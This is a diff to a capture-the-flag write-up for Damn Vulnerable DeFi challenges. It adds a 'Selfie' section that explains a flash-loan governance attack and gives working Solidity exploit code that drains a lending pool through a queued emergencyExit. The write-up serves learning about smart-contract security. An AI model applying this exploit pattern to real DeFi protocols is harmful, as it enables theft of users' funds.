@@ -230,7 +230,7 @@ This means that we can call any function we want from the flashLoan function. So
 
 ## 4. Side entrance
 
-### Challenge overview
+### Challenge Overview
 
 A surprisingly simple pool allows anyone to deposit ETH, and withdraw it at any point in time.
 It has 1000 ETH in balance already, and is offering free flashloans using the deposited ETH to promote their system.
@@ -290,7 +290,7 @@ This attack allows us to drain all ETH from the pool without actually owning any
 
 ## 5. The rewarder
 
-### Challenge overview
+### Challenge Overview
 
 A contract is distributing rewards of Damn Valuable Tokens and WETH.    
 To claim rewards, users must prove they're included in the chosen set of beneficiaries. Don't worry about gas though. The contract has been optimized and allows claiming multiple tokens in the same transaction.  
@@ -383,4 +383,83 @@ Attack flow:
 
         dvt.transfer(recovery, dvt.balanceOf(player));
         weth.transfer(recovery, weth.balanceOf(player));
+    }
+
+
+## 6. Selfie
+
+### Challenge Overview
+
+A new lending pool has launched! It’s now offering flash loans of DVT tokens. It even includes a fancy governance mechanism to control it.  
+What could go wrong, right ?    
+You start with no DVT tokens in balance, and the pool has 1.5 million at risk.  
+Rescue all funds from the pool and deposit them into the designated recovery account.
+
+### Vulnerability Analysis
+
+The first vulerability we can see is that the contract let's us take all of it's token as loan. The second fundamental issue is that the governance mechanism doesn't differentiate between token holders and accounts that only momentarily hold tokens (like during a flash loan). This creates a critical vulnerability where temporary capital can be used to influence governance decisions with permanent consequences.
+
+Attack flow:
+
+1. Take a flash loan of the majority of DVT tokens
+2. Use these temporarily held tokens to self-delegate voting power
+3. Queue a governance proposal to call emergencyExit() with a destination address they control
+4. Return the flash-loaned tokens
+5. Execute the queued action to drain the pool
+
+### Solution
+
+    contract Drainer is IERC3156FlashBorrower {
+        SelfiePool pool;
+        SimpleGovernance governance;
+        DamnValuableVotes token;
+        address recovery;
+        uint256 actionId;
+        bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
+
+        constructor(address _pool, address _governance, address _token, address _recovery) {
+            pool = SelfiePool(_pool);
+            governance = SimpleGovernance(_governance);
+            token = DamnValuableVotes(_token);
+            recovery = _recovery;
+        }
+
+        function startAttack() external {
+            uint256 amount = SelfiePool(pool).maxFlashLoan(address(token));
+            SelfiePool(pool).flashLoan(this, address(token), amount, "");
+        }
+
+        function onFlashLoan(
+            address sender,
+            address _token,
+            uint256 amount,
+            uint256 fee,
+            bytes calldata data
+        ) external returns (bytes32) {
+
+            require(msg.sender == address(pool), "Pool is not sender");
+            require(sender == address(this), "Sender is not the owner");
+
+            token.delegate(address(this));
+
+            bytes memory payload = abi.encodeWithSignature("emergencyExit(address)", recovery);
+            actionId = governance.queueAction(address(pool), 0, payload);
+
+            token.approve(address(pool), amount);
+            return CALLBACK_SUCCESS;
+        }
+
+        function executeProposal() external {
+            governance.executeAction(actionId);
+        }
+    }
+
+    /**
+     * CODE YOUR SOLUTION HERE
+     */
+    function test_selfie() public checkSolvedByPlayer {
+        Drainer drainer = new Drainer(address(pool), address(governance), address(token), recovery);
+        drainer.startAttack();
+        vm.warp(block.timestamp + 2 days);
+        drainer.executeProposal();
     }
